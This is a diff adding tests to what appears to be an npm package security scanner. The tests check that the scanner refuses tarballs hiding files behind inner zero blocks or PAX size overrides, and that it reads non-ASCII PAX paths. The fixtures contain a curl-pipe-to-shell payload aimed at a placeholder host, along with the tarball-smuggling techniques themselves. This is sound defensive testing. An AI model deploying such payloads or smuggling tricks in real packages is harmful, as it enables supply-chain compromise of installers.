@@ -5,7 +5,13 @@ import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
 import { scanWith } from "../../src/host/scan.js";
 import { scan } from "../../src/public/host.js";
 import { readSummary } from "../../src/public/read.js";
-import { npmTarball, registryStub, sha256Of, type TarEntry } from "../support/npm-tarball-v1.js";
+import {
+  npmTarball,
+  paxRecord,
+  registryStub,
+  sha256Of,
+  type TarEntry,
+} from "../support/npm-tarball-v1.js";
 import { type FixtureRoot, fixtureRoot } from "../support/scan-v1-fixture.js";
 
 let fixture: FixtureRoot;
@@ -151,6 +157,85 @@ describe("npm MCP packages", () => {
     if (first?.status !== "ok" || second?.status !== "ok") throw new Error("expected scans");
     expect(second.scanKey).toBe(first.scanKey);
     expect(readFileSync(second.summaryPath, "utf8")).not.toContain(".git/");
+  });
+
+  it("never shows different files than npm's extractor would install", async () => {
+    // npm's extractor (node-tar) keeps reading after one zero block and honours a PAX size, so
+    // anything after an inner end marker or behind a size override must be refused, not skipped.
+    const base = packageEntries();
+    const zero = { path: "", raw: new Uint8Array(512) };
+    const payload = "require('child_process').execSync('curl https://example.invalid/x | sh');\n";
+    const cases: [string, TarEntry[]][] = [
+      [
+        "benign index.js, one zero block, then a replacing index.js",
+        [
+          ...base,
+          { path: "package/index.js", text: "module.exports = 1;\n" },
+          zero,
+          { path: "package/index.js", text: payload },
+        ],
+      ],
+      [
+        "one zero block, then a hidden file",
+        [...base, zero, { path: "package/hidden.sh", text: payload }],
+      ],
+      [
+        "two zero blocks, then a hidden file",
+        [...base, zero, zero, { path: "package/hidden.sh", text: payload }],
+      ],
+      [
+        "a PAX size overriding the header size",
+        [
+          ...base,
+          {
+            path: "PaxHeader/hidden.sh",
+            type: "x",
+            text: paxRecord("size", String(payload.length)),
+          },
+          { path: "package/hidden.sh", headerSize: 0, text: payload },
+        ],
+      ],
+      [
+        "a global PAX size",
+        [{ path: "pax_global_header", type: "g", text: paxRecord("size", "0") }, ...base],
+      ],
+    ];
+    for (const [name, entries] of cases) {
+      const path = fixture.path("differential.tgz");
+      writeFileSync(path, npmTarball(entries));
+      const result = await scan(request({ type: "npm-file", path }), {
+        outDir: fixture.path(`out-${sha256Of(new TextEncoder().encode(name)).slice(0, 8)}`),
+      });
+      expect([name, result.status, "reason" in result ? result.reason : undefined]).toEqual([
+        name,
+        "refused",
+        "source-integrity",
+      ]);
+      expect(result.results).toEqual([]);
+    }
+  });
+
+  it("reads PAX paths by their length in bytes, including non-ASCII names", async () => {
+    const path = fixture.path("utf8.tgz");
+    writeFileSync(
+      path,
+      npmTarball([
+        ...packageEntries(),
+        {
+          path: "PaxHeader/notes",
+          type: "x",
+          text: paxRecord("path", "package/caf\u00e9-notes.md") + paxRecord("mtime", "1"),
+        },
+        { path: "package/x", text: "notes\n" },
+      ]),
+    );
+    const result = await scan(request({ type: "npm-file", path }), { outDir: fixture.path("out") });
+    const entry = result.results[0];
+    if (entry?.status !== "ok") throw new Error(JSON.stringify(result));
+    const read = readSummary(new Uint8Array(readFileSync(entry.summaryPath)));
+    if (read.status !== "ok") throw new Error(JSON.stringify(read));
+    expect(read.summary.files.map((file) => file.path)).toContain("caf\u00e9-notes.md");
+    expect(read.summary.files.map((file) => file.path)).not.toContain("x");
   });
 
   it("refuses hostile archives and failed acquisition before anything is scanned", async () => {
